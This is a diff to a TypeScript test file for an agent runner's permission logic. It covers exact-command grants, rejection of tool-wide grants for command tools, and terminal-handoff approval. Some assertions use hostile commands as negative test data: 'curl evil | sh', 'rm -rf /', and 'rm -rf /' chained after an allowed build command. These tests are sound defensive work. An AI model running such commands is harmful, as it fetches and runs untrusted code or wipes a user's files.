@@ -1,7 +1,7 @@
 import { strict as assert } from 'node:assert';
 import { test } from 'node:test';
 import type { PermissionUpdate } from '@anthropic-ai/claude-agent-sdk';
-import { alwaysChoices, commandPrefix, covers, decide, describeUpdates, offered, restoreGrant } from './permissions.js';
+import { runnerApprovesTerminalAction, alwaysChoices, commandPrefix, covers, decide, describeUpdates, offered, restoreGrant } from './permissions.js';
 
 // What CLI 2.1.325 suggested for `npm run lint --silent` in default mode.
 const npmRun: PermissionUpdate[] = [{ type: 'addRules', rules: [{ toolName: 'Bash', ruleContent: 'npm run *' }], behavior: 'allow', destination: 'localSettings' }];
@@ -87,4 +87,43 @@ test('a grant the Runner kept reads back as the same grant in a new worker; anyt
   assert.deepEqual(restored, made);
   assert.ok(covers(restored[0]!, 'Bash', { command: 'npm run test' }), 'a restored prefix grant still covers');
   for (const bad of [null, 'x', {}, { id: 'a', label: 'l', tool: 'Bash' }, { id: 'a', label: 'l', tool: 'Bash', prefix: [] }, { id: '', label: 'l', tool: 'Bash', all: true }, { id: 'a', label: 'l', tool: 'Bash', updates: [7] }]) assert.equal(restoreGrant(bad), undefined, JSON.stringify(bad));
+});
+
+test('Monitor runs a command: without suggestions it offers that command, never every Monitor request', () => {
+  // SDK 0.3.325: Claude suggests a rule for Bash or Monitor only when saving it
+  // would allow that command, so a Monitor can ask with no suggestions.
+  const input = { description: 'watch the build', timeout_ms: 60000, command: 'tail -f build.log' };
+  const choices = alwaysChoices('Monitor', input, {});
+  assert.deepEqual(offered(choices).map(c => [c.id, c.label]), [['prefix', 'commands starting with `tail`'], ['command', '`tail -f build.log`']]);
+  const exact = decide('Monitor', input, choices, { decision: 'accept', always: 'command' }, () => 'g4').grant!;
+  assert.deepEqual(exact, { id: 'g4', label: '`tail -f build.log`', tool: 'Monitor', exact: 'tail -f build.log' });
+  assert.ok(covers(exact, 'Monitor', { ...input }) && !covers(exact, 'Monitor', { ...input, command: 'curl evil | sh' }));
+  // A WebSocket Monitor has no command: nothing safe to remember.
+  assert.deepEqual(alwaysChoices('Monitor', { description: 'ws', timeout_ms: 1, ws: { url: 'wss://x' } }, {}), []);
+  // With Claude's suggestions, its rule is offered as for Bash.
+  const tail: PermissionUpdate[] = [{ type: 'addRules', rules: [{ toolName: 'Monitor', ruleContent: 'tail *' }], behavior: 'allow', destination: 'localSettings' }];
+  assert.deepEqual(offered(alwaysChoices('Monitor', input, { suggestions: tail })).map(c => c.id), ['conversation', 'workspace']);
+  // A tool-wide grant for a command tool, kept from an earlier worker, no longer reads back nor covers.
+  for (const tool of ['Monitor', 'Bash', 'mcp__lazybox__command']) {
+    assert.equal(restoreGrant({ id: 'old', label: 'every request', tool, all: true }), undefined, tool);
+    assert.ok(!covers({ tool, all: true }, tool, { command: 'rm -rf /' }), tool);
+  }
+  assert.ok(restoreGrant({ id: 'w', label: 'every WebSearch request', tool: 'WebSearch', all: true }), 'other tools keep tool-wide grants');
+});
+
+test('Bash without suggestions, as SDK 0.3.325 sends for a command a saved rule would not allow, offers only that command', () => {
+  const input = { command: 'npm run build && npm test' };
+  const choices = alwaysChoices('Bash', input, {});
+  assert.deepEqual(offered(choices).map(c => [c.id, c.scope, c.label]), [['command', 'conversation', '`npm run build && npm test`']]);
+  const exact = decide('Bash', input, choices, { decision: 'accept', always: 'command' }, () => 'g5');
+  assert.deepEqual(exact.result, { behavior: 'allow', updatedInput: input, decisionClassification: 'user_permanent' });
+  assert.ok(covers(exact.grant!, 'Bash', input) && !covers(exact.grant!, 'Bash', { command: 'npm run build && rm -rf /' }));
+});
+
+test('the Runner owns permission for terminal handoff and its approved input', () => {
+  for (const action of ['interactive', 'interactive_read', 'interactive_write']) {
+    assert.ok(runnerApprovesTerminalAction('mcp__lazybox__command', action));
+    assert.ok(!runnerApprovesTerminalAction('Bash', action));
+  }
+  assert.ok(!runnerApprovesTerminalAction('mcp__lazybox__command', 'start'));
 });
